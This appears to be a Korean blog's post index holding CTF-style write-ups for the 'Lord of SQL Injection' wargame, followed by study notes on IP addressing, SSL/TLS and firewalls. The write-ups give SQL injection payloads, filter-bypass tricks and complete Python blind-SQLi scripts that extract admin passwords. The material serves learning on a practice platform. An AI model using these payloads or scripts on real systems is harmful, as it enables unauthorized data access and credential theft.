떴을 시, guest+해당 문자열+%을 admin에 할당하고 중첩반복문을 완전히 탈출해준다.[2-2] 첫번째 문자를 고정한 채로 두번째 문자에 대해 ASCII 48~126를 탐색하는 도중 Hello guest가 떴을 시, 해당 문자열을 guest에 추가하고 다음 루프로 넘어가준다. 첫번째 루프에서와 마찬가지로, Hello admin이 뜨지 않고 Hello guest가 떴다면, 이는 두 계정의 pw 두번째 문자가 겹친다는 뜻이다.이하는 동일한 로직으로 반복된다.결국 해당 코드는 admin과 guest의 pw가 달라지는 지점의 admin의 앞자리를 출력하게 된다.예를 들어,admin pw : 123abcguest pw : 123xyz인 경우,123a% 를 출력하고 종료되는 것이다.출력문은 admin의 pw에 대한 적절한 검색어로 사용될 수 있다.다음은 해당 코드의 실행 결과다.Brute Force 결과, 적절한 검색어는 902% 이다.결과" }, { "title": "LOS - 14번 giant", "url": "/posts/los-14/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-09 00:00:00 +0900", "snippet": "[14] giant문제풀이이전과는 조금 다른 형태다.처음 보고는 이게 뭐지 싶었지만…where 1 == TRUE 임을 알고 나니 감이 왔다.from과 prob_giant 사이에 공백을 삽입하여 올바른 쿼리로 만들어주면 풀리는 문제인 것 같다.다만, preg_match를 살펴보면공백 및 자주 쓰이는 공백 우회 문자들을 필터링하고 있기 때문에해당 문자들을 제외한 우회 문자를 적용해줘야 할 것 같다.그 예로는 %0b, %0c 등이 있다.한편, strlen은 해당 문자열의 Byte 크기를 반환하는 함수이다.공백은 1Byte이기 때문에 해당 함수에 걸러질 일은 없을 것이다.입력할 문자열은 %0b 이다.결과" }, { "title": "LOS - 13번 bugbear", "url": "/posts/los-13/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-09 00:00:00 +0900", "snippet": "[13] bugbear문제풀이preg_match에 뭐가 좀 많다.하나하나 살펴본다.필터링 사항이다.① 싱글쿼터② substr③ ascii④ =⑤ or/and⑥ 공백⑦ like⑧ 0x지금까지의 필터링 사항을 몽땅 다 집어넣었다.추가로 like에 대한 필터링까지 적용되었는데, 이에 대한 우회 방법은 다음과 같다.① like ⇒ in ex. id like “admin” ⇒ id in (“admin”)그리고 또 한가지 특이사항이 있다.저번 문제에서는 ascii를 ord로 우회했었다.그러나 이번 문제에서는 or을 필터링하고 있기 때문에 ord도 해당 필터에 걸려버린다.(이 부분을 간과해서 시간을 잡아먹었다…)따라서 이번 문제에서는 ascii를 hex로 우회해준다.hex 함수는 이름 그대로, 문자를 ascii가 아닌 hex로 나타내주는 함수이다.hex의 반환 타입은 string이기에 단순 숫자로 취급하여 대소 비교를 해줄 수는 없다.때문에 in을 사용하여 문자열 일치 확인을 해줄 것이다.이 때, 비교 대상으로 사용할 ascii값도 hex로 변환하여 비교해준다. ex. hex(mid(…)) in (hex(1))한편, 준비된 쿼리문은 12번 문제와 동일하기 때문에,쿼리문 변조 방향에 대한 상세한 설명은 이전 포스팅으로 대체한다.이상의 내용을 반영하여 자동화 코드의 check_length() 를 다음과 같이 수정해준다.def check_length(url, cookie): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} print(&quot;대상 문자열의 길이를 확인중입니다..&quot;) for num in range(0,30): param=f&quot;?no=0||id%09in%09(\\&quot;admin\\&quot;)%26%26length(pw)&amp;gt;{num}%09%23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; not in res.text): return num① or/and ⇒ ||, %26%26② 공백 ⇒ %09③ like ⇒ in다음으로는 blind_sqli() 를 다음과 같이 수정해준다.def blind_sqli(url, cookie, length): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} ans=&quot;&quot; for len in range(1, length+1): print(f&quot;{len}번째 문자에 대해 검색중입니다..&quot;) for ran in range(32,127): param=f&quot;?no=0||id%09in%09(\\&quot;admin\\&quot;)%26%26hex(mid(pw,{len},1))%09in%09(hex({ran}))%09%23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; in res.text): print(f&quot;{len}번째 문자 → {chr(ran)}&quot;) ans+=chr(ran) break return ans① or/and ⇒ ||, %26%26② 공백 ⇒ %09③ like ⇒ in④ substr ⇒ mid⑤ ascii ⇒ hex수정된 Python 자동화 코드의 전문이다.import requestsdef check_length(url, cookie): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} print(&quot;대상 문자열의 길이를 확인중입니다..&quot;) for num in range(0,30): param=f&quot;?no=0||id%09in%09(\\&quot;admin\\&quot;)%26%26length(pw)&amp;gt;{num}%09%23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; not in res.text): return numdef blind_sqli(url, cookie, length): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} ans=&quot;&quot; for len in range(1, length+1): print(f&quot;{len}번째 문자에 대해 검색중입니다..&quot;) for ran in range(32,127): param=f&quot;?no=0||id%09in%09(\\&quot;admin\\&quot;)%26%26hex(mid(pw,{len},1))%09in%09(hex({ran}))%09%23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; in res.text): print(f&quot;{len}번째 문자 → {chr(ran)}&quot;) ans+=chr(ran) break return ansif __name__ == &quot;__main__&quot;: print(&quot;💘 Blind 공격을 시작합니다&quot;) url=input(&quot;URL을 입력하세요:&quot;) cookie=input(&quot;cookie를 알려주세요:&quot;) length=check_length(url, cookie) print(f&quot;👏 pw의 길이는 {length}입니다.&quot;) ans=blind_sqli(url, cookie, length) print(f&quot;👏 pw의 정체는 {ans}입니다!&quot;) exitBlind 공격 결과, admin의 pw는 52dc3991 이다.결과" }, { "title": "LOS - 12번 darkknight", "url": "/posts/los-12/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-09 00:00:00 +0900", "snippet": "[12] darkknight문제풀이필터링 사항은 다음과 같다.① 싱글쿼터② substr③ ascii④ =substr/ascii 필터링 우회 방법은 다음과 같다.① substr ⇒ ord② ascii ⇒ mid또한, 이전 문제와 마찬가지로 admin의 pw를 알아야 풀 수 있는 Blind SQLi 문제이다.기존에 사용했던 자동화 코드에 새로운 필터링 사항을 적용해주면 될 것 같다.다만, 이전과는 달리 파라미터가 두개이므로 (pw, no) 서버측 쿼리문을 잠시 살펴보겠다.준비된 쿼리문은 다음과 같다.$query = &quot;select id from prob_darkknight where id=&#39;guest&#39; and pw=&#39;{$_GET[pw]}&#39; and no={$_GET[no]}&quot;;위 쿼리문을 아래와 같이 변조해줄 것이다.$query = &quot;select id from prob_darkknight where (id=&#39;guest&#39; and pw=&#39;&#39; and no=0) or id like \\&quot;admin\\&quot; %26%26 [pw 길이 확인 또는 pw 추출] %23&quot;;① id부터 no까지를 하나의 중첩된 and 조건절로 묶어준다. 어차피 FALSE로 만드는 것이 목표이기 때문에 pw는 비워두고 no에는 아무 숫자나 할당해준다.② || id like “admin” &amp;amp;&amp;amp; 뒤에 적절한 조건절을 삽입하여 pw 길이 확인 또는 pw 추출을 수행해준다.이상의 내용을 반영하여 자동화 코드의 check_length() 를 다음과 같이 수정해준다.def check_length(url, cookie): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} print(&quot;대상 문자열의 길이를 확인중입니다..&quot;) for num in range(0,30): param=f&quot;?no=0 || id like \\&quot;admin\\&quot; %26%26 length(pw)&amp;gt;{num} %23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; not in res.text): return num① = ⇒ like (문자열 일치 확인)② = ⇒ &amp;gt; (ASCII 대소 비교) 숫자를 점점 올려가며 비교하기 때문에, 최초로 Hello admin이 뜨지 않는 경우가 곧 아스키가 일치하는 경우이다.다음으로는 blind_sqli() 를 다음과 같이 수정해준다.def blind_sqli(url, cookie, length): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} ans=&quot;&quot; for len in range(1, length+1): print(f&quot;{len}번째 문자에 대해 검색중입니다..&quot;) for ran in range(32,127): param=f&quot;?no=0 || id like \\&quot;admin\\&quot; %26%26 ord(mid(pw,{len},1))&amp;gt;{ran} %23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; not in res.text): print(f&quot;{len}번째 문자 → {chr(ran)}&quot;) ans+=chr(ran) break return ans① substr ⇒ ord② ascii ⇒ mid수정된 Python 자동화 코드의 전문은 다음과 같다.import requestsdef check_length(url, cookie): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} print(&quot;대상 문자열의 길이를 확인중입니다..&quot;) for num in range(0,30): param=f&quot;?no=0 || id like \\&quot;admin\\&quot; %26%26 length(pw)&amp;gt;{num} %23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; not in res.text): return numdef blind_sqli(url, cookie, length): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} ans=&quot;&quot; for len in range(1, length+1): print(f&quot;{len}번째 문자에 대해 검색중입니다..&quot;) for ran in range(32,127): param=f&quot;?no=0 || id like \\&quot;admin\\&quot; %26%26 ord(mid(pw,{len},1))&amp;gt;{ran} %23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; not in res.text): print(f&quot;{len}번째 문자 → {chr(ran)}&quot;) ans+=chr(ran) break return ansif __name__ == &quot;__main__&quot;: print(&quot;💘 Blind 공격을 시작합니다&quot;) url=input(&quot;URL을 입력하세요:&quot;) cookie=input(&quot;cookie를 알려주세요:&quot;) length=check_length(url, cookie) print(f&quot;👏 pw의 길이는 {length}입니다.&quot;) ans=blind_sqli(url, cookie, length) print(f&quot;👏 pw의 정체는 {ans}입니다!&quot;) exitBlind 공격 결과, admin의 pw는 0b70ea1f 임을 알 수 있다.결과" }, { "title": "LOS - 11번 golem", "url": "/posts/los-11/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-08 00:00:00 +0900", "snippet": "[11] golem문제풀이이번 문제에서는① or/and② substr(③ =를 필터링하고 있다.또한 근본적으로는 pw를 알아야 풀 수 있는 Blind SQLi 문제이다. (∵ addslashes)이전에 써먹었던 자동화 코드에 필터링 우회를 적용해주면 될 것 같다.먼저, 자동화 코드의 check_length() 를 다음과 같이 수정해준다.def check_length(url, cookie, param_name): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} print(&quot;대상 문자열의 길이를 확인중입니다..&quot;) for num in range(0,30): param=f&quot;?{param_name}=&#39; || id like \\&quot;admin\\&quot; %26%26 length({param_name})&amp;gt;{num} %23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; not in res.text): return num① or ⇒ ||② and ⇒ %26%26③ = ⇒ like (문자열 일치 확인)④ = ⇒ &amp;gt; (ASCII 대소 비교) 숫자를 점점 올려가며 비교하기 때문에, 최초로 Hello admin이 뜨지 않는 경우가 곧 아스키가 일치하는 경우이다.다음으로는 blind_sqli() 를 다음과 같이 수정해준다.def blind_sqli(url, cookie, param_name, length): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} ans=&quot;&quot; for len in range(1, length+1): print(f&quot;{len}번째 문자에 대해 검색중입니다..&quot;) for ran in range(32,127): param=f&quot;?{param_name}=&#39; || id like \\&quot;admin\\&quot; %26%26 ascii(substring({param_name},{len},1))&amp;gt;{ran} %23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; not in res.text): print(f&quot;{len}번째 문자 ⇒ {chr(ran)}&quot;) ans+=chr(ran) break return ans① or ⇒ ||② and ⇒ %26%26③ substr( ⇒ substring(④ = ⇒ like (문자열 일치 확인)⑤ = ⇒ &amp;gt; (ASCII 대소 비교) 마찬가지로, 숫자를 점점 올려가며 비교하기 때문에, 최초로 Hello admin이 뜨지 않는 경우가 곧 아스키가 일치하는 경우이다.수정된 Python 자동화 코드의 전문은 다음과 같다.import requestsdef check_length(url, cookie, param_name): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} print(&quot;대상 문자열의 길이를 확인중입니다..&quot;) for num in range(0,30): param=f&quot;?{param_name}=&#39; || id like \\&quot;admin\\&quot; %26%26 length({param_name})&amp;gt;{num} %23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; not in res.text): return numdef blind_sqli(url, cookie, param_name, length): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} ans=&quot;&quot; for len in range(1, length+1): print(f&quot;{len}번째 문자에 대해 검색중입니다..&quot;) for ran in range(32,127): param=f&quot;?{param_name}=&#39; || id like \\&quot;admin\\&quot; %26%26 ascii(substring({param_name},{len},1))&amp;gt;{ran} %23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; not in res.text): print(f&quot;{len}번째 문자 → {chr(ran)}&quot;) ans+=chr(ran) break return ansif __name__ == &quot;__main__&quot;: print(&quot;💘 Blind 공격을 시작합니다&quot;) url=input(&quot;URL을 입력하세요:&quot;) cookie=input(&quot;cookie를 알려주세요:&quot;) param_name=input(&quot;파라미터의 이름을 알려주세요:&quot;) length=check_length(url, cookie, param_name) print(f&quot;👏 {param_name}의 길이는 {length}입니다.&quot;) ans=blind_sqli(url, cookie, param_name, length) print(f&quot;👏 {param_name}의 정체는 {ans}입니다!&quot;) exitBlind 공격 결과, admin의 pw는 77d6290b 임을 알 수 있다.결과" }, { "title": "LOS - 10번 skeleton", "url": "/posts/los-10/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-08 00:00:00 +0900", "snippet": "[10] skeleton문제풀이solve의 조건은 id==admin 이다.준비된 쿼리문은 다음과 같다.$query = &quot;select id from prob_skeleton where id=&#39;guest&#39; and pw=&#39;{$_GET[pw]}&#39; and 1=0&quot;;지금까지 해온 것처럼,$_GET[pw] 부분에 적절한 쿼리문을 넣어 id=’admin’이 정상 처리되게끔 해주면 된다.$_GET[pw]를 기준으로앞부분의 쿼리는 싱글쿼터를 하나 삽입함으로써 FALSE로 만들어주고,뒷부분은 주석 처리하여 무시되게끔 해주면 될 것 같다.즉, 목표는 준비된 쿼리문을 다음과 같이 변조해주는 것이다.$query = &quot;select id from prob_skeleton where (id=&#39;guest&#39; and pw=&#39;&#39;) or id=&#39;admin&#39; #&#39; and 1=0&quot;;① 논리연산자의 실행 순서에 따라 앞부분 조건절은 하나로 묶여 FALSE로 처리됨② || id=’admin’ 을 삽입하여 id가 admin인 레코드를 뽑아옴③ 뒷부분은 주석으로 날려줌복잡해보이지만 지금까지와 다를 바 없다.최종적으로 입력할 쿼리문은 다음과 같다.&#39; or id=&#39;admin&#39; %23결과" }, { "title": "LOS - 9번 vampire", "url": "/posts/los-9/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-07 08:00:00 +0900", "snippet": "[09] vampire문제풀이새로운 함수들이 눈에 띈다.천천히 살펴보면,① 싱글쿼터 필터링② 문자열을 소문자로 변환③ admin 문자열 삭제를 적용하고 있음을 확인할 수 있다.adadminmin을 입력해주면 중간에 있는 admin이 필터에 걸려 삭제되고,최종적으로 남는 문자열은 결국 admin이 될 것 같다.입력할 문자열은 adadminmin 이다.결과" }, { "title": "LOS - 8번 troll", "url": "/posts/los-8/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-07 07:00:00 +0900", "snippet": "[08] troll문제풀이preg_match를 살펴보면, 싱글쿼터와 admin 문자열을 필터링하고 있음을 알 수 있다.preg_match() 내부를 살펴보면,패턴임을 명시하기 위해 해당 부분을 슬래시(/)로 감싸놓았다.마지막 슬래시 뒤에는 옵션을 줄 수 있는데, i는 대소문자 구분을 하지 않음을 의미한다.지금까지의 문제들은 항상 옵션으로 i가 적용되어 있었다.그러나 이번 문제의 admin 필터를 보면, 마지막 슬래시 뒤에 옵션이 붙어있지 않음을 알 수 있다.이는 해당 함수가 오로지 소문자 admin만을 필터링하고 있음을 말한다.즉, Admin이나 ADMIN이나 AdMiN 등은 전혀 거르지 않고 있다는 것이다.Sql은 대소문자 구분을 하지 않기 때문에, admin이나 ADMIN이나 같은 문자열로 인식한다.따라서, 이번 문제의 답은 그냥 Admin 이다.결과" }, { "title": "LOS - 7번 orge", "url": "/posts/los-7/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-07 00:00:00 +0900", "snippet": "[07] orge문제풀이천천히 살펴보면, 4번 문제와 6번 문제를 합쳐놓았다는 것을 알 수 있다. 4번 Blind SQLi + 6번 or/and 필터링4번 문제를 풀 때 썼던 Blind SQLi 자동화 코드에6번 문제를 풀 때 썼던 or/and 필터링 우회 방법을 적용시켜주면 될 것 같다.따라서 자동화 코드의 파라미터 부분을 다음과 같이 수정해준다.param=f&quot;?{param_name}=&#39; || id=\\&quot;admin\\&quot; %26%26 length({param_name})={num} %23&quot; or ⇒ || and ⇒ %26%26 import requestsdef check_length(url, cookie, param_name): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} print(&quot;대상 문자열의 길이를 확인중입니다..&quot;) for num in range(0,30): param=f&quot;?{param_name}=&#39; || id=\\&quot;admin\\&quot; %26%26 length({param_name})={num} %23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; in res.text): return numdef blind_sqli(url, cookie, param_name, length): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} ans=&quot;&quot; for len in range(1, length+1): print(f&quot;{len}번째 문자에 대해 검색중입니다..&quot;) for ran in range(32,127): param=f&quot;?{param_name}=&#39; || id=\\&quot;admin\\&quot; %26%26 ascii(substr({param_name},{len},1))={ran} %23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; in res.text): print(f&quot;{len}번째 문자 → {chr(ran)}&quot;) ans+=chr(ran) break return ansif __name__ == &quot;__main__&quot;: print(&quot;💘 Blind 공격을 시작합니다&quot;) url=input(&quot;URL을 입력하세요:&quot;) cookie=input(&quot;cookie를 알려주세요:&quot;) param_name=input(&quot;파라미터의 이름을 알려주세요:&quot;) length=check_length(url, cookie, param_name) print(f&quot;👏 {param_name}의 길이는 {length}입니다.&quot;) ans=blind_sqli(url, cookie, param_name, length) print(f&quot;👏 {param_name}의 정체는 {ans}입니다!&quot;) exitBlind 공격 결과, admin의 pw는 7b751aec 임을 알 수 있다.결과" }, { "title": "LOS - 6번 darkelf", "url": "/posts/los-6/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-07 00:00:00 +0900", "snippet": "[06] darkelf문제풀이solve 조건은 이전 문제와 동일하다.이번 문제에서는 파라미터에 or이나 and이 포함되어있을 시 접근을 제한하고 있음을 알 수 있다.즉, 논리연산자 필터링을 우회하는 문제이다.or/and 논리연산자 필터링 우회를 위한 적절한 대체 문자의 예시는 다음과 같다. or : || and : &amp;amp;&amp;amp;, %26%26 따라서, 주입해야할 쿼리문인 &#39; or id=&#39;admin 에 우회 문자를 적용한 최종 쿼리문은 다음과 같다.&#39; || id=&#39;admin결과" }, { "title": "LOS - 5번 wolfman", "url": "/posts/los-5/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-06 00:00:00 +0900", "snippet": "[05] wolfman문제풀이preg_match로 공백 문자를 필터링하고 있음을 알 수 있다.따라서 쿼리문 삽입 시 공백을 적절한 문자로 대체해주어야 한다.먼저, solve 조건은 다음과 같다.if($result[&#39;id&#39;] == &#39;admin&#39;) solve(&quot;wolfman&quot;);fetch된 레코드의 id가 admin일 시 문제가 풀리게 됨을 알 수 있다.다음은 쿼리문을 보겠다.$query = &quot;select id from prob_wolfman where id=&#39;guest&#39; and pw=&#39;{$_GET[pw]}&#39;&quot;;admin을 fetch 해주려면싱글쿼터로 pw를 닫아준 후,or id=’admin’ 으로 id가 admin인 레코드를 뽑아주면 된다.즉, 주입해야할 쿼리문은 다음과 같다.&#39; or id=&#39;admin그런데 이 문제에서는 파라미터에 공백이 포함되어있을 시 접근을 제한하고 있기 때문에,앞서 인지했던 것처럼 공백을 다른 문자로 대체해주어야 한다.공백 필터링 우회를 위한 적절한 대체 문자의 예시는 다음과 같다. Tab : %09 \\n : %0a \\r : %0d 주석 : /**/ 그 외 이 중 Tab을 선택해 최종 주입할 쿼리문을 정했다.&#39;%09or%09id=&#39;admin결과" }, { "title": "LOS - 4번 orc", "url": "/posts/los-4/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-05 00:00:00 +0900", "snippet": "[04] orc풀이import requests# 길이 확인def check_length(url, cookie, param_name): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} print(&quot;대상 문자열의 길이를 확인중입니다..&quot;) for num in range(0,30): param=f&quot;?{param_name}=&#39; or id=\\&quot;admin\\&quot; and length({param_name})={num} %23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; in res.text): return num# 문자열 찾기def blind_sqli(url, cookie, param_name, length): head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} ans=&quot;&quot; for len in range(1, length+1): print(f&quot;{len}번째 문자에 대해 검색중입니다..&quot;) for ran in range(32,127): param=f&quot;?{param_name}=&#39; or id=\\&quot;admin\\&quot; and ascii(substr({param_name},{len},1))={ran} %23&quot; my_url=url+param res=requests.get(my_url, cookies=head) if(&quot;Hello admin&quot; in res.text): # print(f&quot;{len}번째 문자:{chr(ran)}&quot;) ans+=chr(ran) break return ans# 실행 순서if __name__ == &quot;__main__&quot;: print(&quot;💘 Blind 공격을 시작합니다&quot;) url=input(&quot;URL을 입력하세요:&quot;) cookie=input(&quot;cookie를 알려주세요:&quot;) param_name=input(&quot;파라미터의 이름을 알려주세요:&quot;) length=check_length(url, cookie, param_name) print(f&quot;👏 {param_name}의 길이는 {length}입니다.&quot;) ans=blind_sqli(url, cookie, param_name, length) print(f&quot;👏 {param_name}의 정체는 {ans}입니다!&quot;) exit결과" }, { "title": "LOS - 3번 goblin", "url": "/posts/los-3/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-03 00:00:00 +0900", "snippet": "[03] goblin문제풀이preg_match를 살펴보면, 쿼터를 필터링해주고 있음을 알 수 있다.sql 삽입 시 쿼터를 사용하지 않는 우회 방법을 택해주어야 한다.쿼리문을 보겠다.$query = &quot;select id from prob_goblin where id=&#39;guest&#39; and no={$_GET[no]}&quot;id가 guest인 동시에 no 조건을 충족하는 레코드를 뽑아옴을 알 수 있다.no의 정체를 알기 위해 no=1을 시도해봤다.아래처럼 guest 레코드가 정상 fetch된다.다음으로는 no=2를 시도해봤다.아래처럼 아무 결과도 뜨지 않는다.따라서 guest 레코드의 no는 1임을 짐작할 수 있다.이 문제를 풀기 위해서는, 논리연산자의 특성을 이용하여 조건절 실행의 우선순위를 조정해주어야한다.즉, 다음과 같은 형태의 쿼리문을 만들어줄 것이다.$query = &quot;select id from prob_goblin where (id=&#39;guest&#39; and no=2) or id=&#39;admin&#39;&quot;where 조건절을 살펴보면,① id=’guest’ and no=2 ⇒ FALSE② id=’admin’ ⇒ id가 admin인 레코드① or ② 의 결과, id가 admin인 레코드를 뽑아오게 된다.이 때,해당 문제에서는 쿼터가 필터링되고 있으므로 이를 우회하는 방식으로 sql을 삽입해주어야한다.필터링 우회를 위해 char()을 이용하여 파라미터를 ASCII코드로 전달해준다.admin은 ASCII코드로 다음과 같이 나타낼 수 있다.char(97,100,109,105,110)따라서, 최종 주입할 쿼리문은 다음과 같다.no=2 or id=char(97,100,109,105,110)결과" }, { "title": "IP, 공인/사설 IP, 고정/유동 IP, 내 IP 확인하기", "url": "/posts/IP/", "categories": "Study, Computer", "tags": "", "date": "2021-12-01 00:00:00 +0900", "snippet": "IP1. IP (IPv4)IP 주소는 32bit이며, 8bit (= 1byte) 단위로 점을 찍어 구분한다.00000000.00000000.00000000.00000000위와 같은 표현은 사람이 읽기에 불편하므로 다음과 같이 십진수로 표시하여 사용한다.0.0.0.0이처럼 점으로 구분된 십진 표기법을 Dotted Decimal이라 부른다.우리가 아는 IP 주소는 위와 같은 표기 전환 과정을 거쳐 표현되기 때문에,IP의 범위는 0.0.0.0 ~ 255.255.255.255 이다. 현재는 IPv4 주소의 고갈로 인해 IPv6가 해결책으로 대두되었다.2. 공인 IP / 사설 IP / 고정 IP / 유동 IP자세한 내용은 아래에서 다룬다. 유동 IP = 동적 IP공인 IP와 사설 IP1. 공인 IP와 사설 IP개인 PC에서 인터넷에 연결하기 위해서는ISP로부터 할당받은 공인 IP와라우터로부터 내부적으로 할당받은 사설 IP가 필요하다. ISP (= 인터넷 서비스 공급자) : SK브로드밴드, LG유플러스, KT…2. 공인 IP (Public IP)외부에 공개되어 있는 IP 주소이며, 전세계에서 유일한 값을 갖는다.외부에 공개되어 있기 때문에 인터넷에 연결된 다른 PC로부터의 접근이 가능하다. 방화벽 등의 보안 프로그램을 사용하여 다른 PC의 접근을 차단할 수 있다. ex) 전세계에 ‘모찌아파트’가 하나밖에 없다면, ‘모찌아파트’는 공인 IP다. 3. 사설 IP (Private IP)사설 IP = 로컬 IP = 가상 IPIPv4의 주소 부족으로 인해 서브넷팅된 IP이다.라우터에 의해 로컬 네트워크 상의 PC나 장치에 할당된다.사설 IP 주소를 사용하는 내부 네트워크에서는 인터넷에 연결하기 위해 NAT를 사용한다. 서브넷팅 (= 서브넷 마스킹) : 하나의 네트워크 주소를 여러 개로 분할하는 것을 말한다. NAT (= Network Address Translation) : 사설 IP 주소를 공인 IP 주소로 바꾸어 주는 통신망 주소 변환기 ex) ‘모찌아파트’의 ‘101동 105호’가 사설 IP다. 동호수는 아파트 내에서만 유효한 정보이다. 4. 사설 IP 주소대역A : 10.0.0.0 ~ 10.255.255.255B : 172.16.0.0 ~ 172.31.255.255C : 192.168.0.0 ~ 192.168.255.2555. 공인 IP vs 사설 IP &amp;nbsp; 공인 IP 사설 IP 할당 주체 ISP (= 인터넷 서비스 공급자) 라우터 (= 공유기) 할당 대상 개인 또는 회사의 서버 (= 라우터) 개인 또는 회사의 기기 고유성 인터넷 상에서 유일한 주소 하나의 네트워크 안에서 유일 공개 여부 내/외부 접근 가능 외부 접근 불가능 고정 IP와 유동 IP1. 고정 IP컴퓨터에 고정적으로 부여된 IP로, 한번 부여되면 반납하기 전까지는 다른 장비에 부여할 수 없는 IP를 뜻한다. 기업용 : 인터넷 상에서 서버를 운영하기 위해서는 따로 기업회원으로 가입하여 고정 IP인 공인 IP를 부여받아야 한다.2. 유동 IPDHCP (= Dynamic Host Configuration Protocol) 라고도 불린다.장비에 고정적인 IP를 부여하지 않고, 컴퓨터를 사용할 때 남아 있는 IP 중에서 돌아가면서 부여하는 IP를 뜻한다.사용자가 PC를 껐다 켜거나, 인터넷이 재설정될 경우 사용 가능한 IP가 새롭게 배정된다. 가정용 : 일반적으로 유동 IP인 공인 IP를 부여받는다.내 IP 확인하기1. 공인 IP 확인 방법 whatismyip2. 사설 IP 확인 방법$ ipconfig IPv4 주소 = 사설 IP" }, { "title": "SSL/TLS", "url": "/posts/SSL-TLS/", "categories": "Study, Computer", "tags": "", "date": "2021-11-30 00:00:00 +0900", "snippet": "SSL/TLS1. SSL/TLSSSL (Secure Sockets Layer) ⇒ Netscape 사 개발 (1990년대 중반)TLS (Transport Layer Security) ⇒ IETF 사 개발 (1999년)웹 브라우저와 웹 서버 간 통신을 암호화하기 위해 사용하는 프로토콜이다.TLS는 SSL의 차세대 버전으로, 거의 동일한 작업을 수행하며 점차 SSL을 대체하고 있다.Port는 443이다.웹사이트 URL이 https로 시작하고, 연결이 안전하게 이뤄지고 있음을 알려주는 자물쇠 표시가 뜨면 이는 브라우저가 TLS를 통해 연결되어 있다는 의미이다.2. SSL/TLS 작동 원리 세션 시작 전 비대칭키로 Handshake 세션 도중 세션키를 대칭키로 사용 세션 종료 시 해당 세션키를 폐기 3. SSL/TLS HandshakeHandshake = 두 실체 간 정상적인 통신을 시작하기 위한 자동화된 협상 과정4. SSL Certificate (= SSL 인증서)클라이언트에게 Public 키를 제공하고, 해당 키가 그것을 제공하는 단체와 관련되어 있음을 클라이언트에게 증명해주는 역할을 한다.인증서를 발급하는 기관은 CA (= Certificate Authorities) 라는 곳으로, 신원 확인에 있어 여권 사무소와 비슷한 역할을 한다. SSL/TLS로 서비스를 암호화하려는 기관은 CA로부터 인증서를 구매해야 하며, CA는 해당 기관이 실제로 본인이 주장하는 그 기관이 맞는지를 확인한다.5. SSH vs SSL/TLS &amp;nbsp; SSH SSL/TLS 유사점 1. 보안 연결에 사용되는 프로토콜이다.2. 암호화를 사용하여 두 네트워크 장치 간에 전달되는 데이터를 보호한다.3. 안정적인 연결을 만드는 것이 목적이다. 차이점 1. Port 222. 서버에서 명령을 안전하게 실행하기 위한 것이다.3. 일반적으로 기술자를 위한 도구이다.4. 사용자명/암호를 사용한다. 1. Port 4432. 개인 정보를 안전하게 통신하는 데 사용된다.3. 사용자에게 투명한 웹사이트 보안을 제공하기 위한 메커니즘이다.4. X.509 디지털 인증서를 사용한다. 6. HTTPSHTTPS = Hypertext Transfer Protocol Over Secure Socket Layer = SSL 위에 HTTP를 얹음SSL 인증서가 적용된 도메인만이 https로 시작하는 주소를 가질 수 있다." }, { "title": "방화벽 (Firewall)", "url": "/posts/Firewall/", "categories": "Study, Computer", "tags": "", "date": "2021-11-30 00:00:00 +0900", "snippet": "방화벽 (Firewall)1. 방화벽이란 미리 정의된 보안 규칙에 기반하여, 들어오고 나가는 네크워크 트래픽을 모니터링하고 제어하는 네트워크 보안 시스템이다. 신뢰할 수 있는 내부 네트워크와 신뢰할 수 없는 외부 네트워크 (= 인터넷) 간의 장벽을 구성한다. 서로 다른 네트워크를 지나는 데이터를 허용하거나 거부하거나 검열, 수정하는 하드웨어나 소프트웨어 장치이다. 내부 네트워크 = LAN 외부 네트워크 = WAN 2. 방화벽의 